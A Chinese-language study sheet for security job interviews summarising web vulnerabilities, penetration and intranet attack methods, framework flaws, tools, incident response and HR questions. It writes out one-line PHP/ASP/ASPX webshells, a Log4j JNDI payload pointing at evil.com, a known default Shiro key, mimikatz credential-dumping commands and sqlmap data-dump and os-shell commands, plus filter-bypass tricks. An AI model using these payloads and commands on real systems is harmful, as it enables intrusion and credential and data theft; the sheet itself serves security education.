# 安全面试知识点 Wiki

> 来源：PDF 面试宝典（83页）  
> 整理：2026.07.15  
> 用途：实习/秋招面试突击

---

## 0x00. 基础漏洞篇

### SQL 注入

- **原理**：用户输入直接拼接到 SQL 语句，未经校验
- **分类**：显注（有回显）/ 盲注（布尔型、时间型、报错型）
- **防御**：预编译（PDO 占位符 `?`）、输入过滤、关闭错误提示、WAF、限制数据库权限
- **绕过**：`%` 绕过（IIS）、内联注释 `/*!select*/`、二次编码、multipart 绕过、参数复制、`&&` 替代 `and`、`like/in` 替代 `=`
- **数字型 vs 字符型**：`1'` 报错→字符型，`2-1` 与 `1` 同结果→数字型

### CSRF

- **原理**：盗用受害者身份，以受害者名义发恶意请求
- **防御**：POST 代替 GET、Referer Check、Anti CSRF Token、验证码、浏览器 Cookie SameSite 策略
- **与 SSRF 区别**：CSRF 攻击客户端，SSRF 攻击服务端

### 文件包含

- **函数**：`include()`、`require()`、`include_once()`、`require_once()`
- **类型**：LFI（本地）/ RFI（远程，需 `allow_url_include=on`）
- **利用**：读敏感文件、远程包含 Shell、图片马+包含、伪协议、日志投毒

### 文件上传

- **绕过黑名单**：`.php5`/`.phtml`、`.htaccess`、大小写、空格、`::$DATA`、未循环验证 `x.php..`
- **绕过白名单**：`%00` 截断、图片马、条件竞争

### SSRF

- **存在位置**：在线识图、远程 URL 上传、数据库内置功能、邮件系统
- **利用**：`file` 读文件、`dict` 探端口、`gopher` 打内网 Redis/FTP
- **绕过**：`@` 绕过、IP 省略写法、`xip.io` DNS 解析、八/十六/十进制 IP

### XSS

- **类型**：反射型、存储型、DOM 型
- **DOM 测试点**：`document.write`、`innerHTML`、`outterHTML`、`eval`、`setTimeout`
- **防御**：HTML 实体编码、`httpOnly` Cookie、URLEncode

### XXE

- **原理**：解析用户传入的 XML，未禁用外部实体
- **场景**：PDF/Word 在线解析、定制协议、留言板
- **防御**：`libxml_disable_entity_loader=true`

### 命令执行

- **PHP 函数**：`eval`、`assert`、`preg_replace /e`
- **绕过技巧**：管道 `|`、`${IFS}` 空格、反斜线 `c\at`、`base64` 编码、通配符

### 一句话木马

```
PHP:  <?php @eval($_POST['cmd']); ?>
ASP:  <%execute(request("value"))%>
ASPX: <%@ Page Language="Jscript"%><%eval(Request.Item["value"])%>
```

---

## 0x01. 渗透思路篇

### 渗透测试流程

信息收集 → 漏洞扫描（Nessus/AWVS）→ 手工挖掘（逻辑漏洞）→ 验证 → 修复建议 → 报告输出

### 绕过 CDN 查真实 IP

多地 ping、邮件订阅、二级域名、国外 DNS、历史解析记录、phpinfo、Cloudflare、icon hash、子域名回源

### SQL 二次注入

数据入库时只转义、未过滤 → 存入脏数据 → 下次取用时直接拼接 → 注入

### Sleep 被禁后的延时注入

`BENCHMARK()`、`Get_lock`、超大计算量笛卡尔积

### disable_functions 绕过

LD_PRELOAD、ImageMagick 漏洞、PHP-FPM、GCONV_PATH、蚁剑/冰蝎插件

### webshell 不出网

dnslog 探测、写静态文件、反弹 shell 到内网、http_proxy 代理

---

## 0x02. 内网渗透篇

### 流程

信息收集（网段/端口/账号）→ 权限提升 → 横向移动 → 权限维持 → 痕迹清理

### 黄金票据

需要：域名、域 SID、KRBTGT Hash。伪造 TGT 访问任意服务

### mimikatz

`sekurlsa::logonpasswords` 抓明文、`lsadump::dcsync` 导出域控 Hash

### Linux 提权

内核漏洞、SUID 提权、`sudo -l`、crontab 劫持、NFS 提权、Docker 逃逸

### Windows 提权

内核漏洞、服务提权、令牌窃取、AlwaysInstallElevated、任务计划

### 权限维持

Linux：SSH 公钥、Crontab 后门、Rootkit  
Windows：隐藏账号、计划任务、注册表自启、WMI 事件订阅

---

## 0x03. 框架漏洞篇

### Struts2

S2-045（文件上传 Content-Type OGNL）、S2-016（`redirect:`）、S2-032 等

### Log4j

JNDI 注入：`${jndi:ldap://evil.com/a}` → 加载远程 Java 类 → RCE

### Fastjson

AutoType 反序列化：`@type` 指定类 → 构造利用链 → RCE  
不出网打法：写文件、注入内存马

### Shiro

默认 KEY（`kPH+bIxk5D2deZiIxcaaaA==`）→ RememberMe 反序列化

### Weblogic/JBoss

Weblogic：T3 协议反序列化、弱口令 console  
JBoss：JMX Console 未授权 → `invoker/JMXInvokerServlet` 反序列化

---

## 0x04. 未授权访问速查

| 服务 | 端口 | 利用 |
|------|:---:|------|
| Redis | 6379 | `CONFIG SET dir` 写 SSH key |
| Mongodb | 27017 | 无密码直接连 |
| Memcache | 11211 | `stats` 泄露信息 |
| Jenkins | 8080 | `/script` 执行命令 |
| Elasticsearch | 9200 | `/_nodes` 查看节点 |
| ZooKeeper | 2181 | `dump` 获取拓扑 |
| Docker | 2375 | `/containers/json` |
| Nacos | 8848 | `/nacos/v1/auth/users` |

---

## 0x05. 安全工具篇

### SQLmap

```bash
sqlmap -u "url" --dbs                    # 爆库
sqlmap -u "url" -D db --tables           # 爆表
sqlmap -u "url" -D db -T table --dump    # 脱数据
sqlmap -u "url" --os-shell               # getshell
```

### 菜刀/蚁剑/冰蝎流量特征

- 菜刀：明文 base64 传输，`eval(base64_decode())`
- 蚁剑：自定义编码器，流量可混淆
- 冰蝎：AES 加密，动态密钥协商

---

## 0x06. 应急响应篇

### 入侵排查流程

检查日志 → 检查账号 → 检查进程/端口 → 检查启动项 → 检查定时任务 → 检查文件

### Windows 被登录

`事件查看器` → 安全日志 → 事件 ID 4624（登录成功）/ 4625（登录失败）

### SSH 被爆破

`/var/log/auth.log`、`/var/log/secure` → `grep "Failed password"`

### 应急响应六步

准备 → 检测 → 抑制 → 根除 → 恢复 → 跟踪

---

## 0x07. 面试 HR 终面

- **离职原因**：发展空间/技术方向匹配度/期望更有挑战
- **优缺点**：缺点说正在改进的（不是致命伤）
- **还有问题要问**：团队技术栈/新人培养体系/技术分享文化

---

*完整 PDF 共 83 页，以上为结构化精简版。*
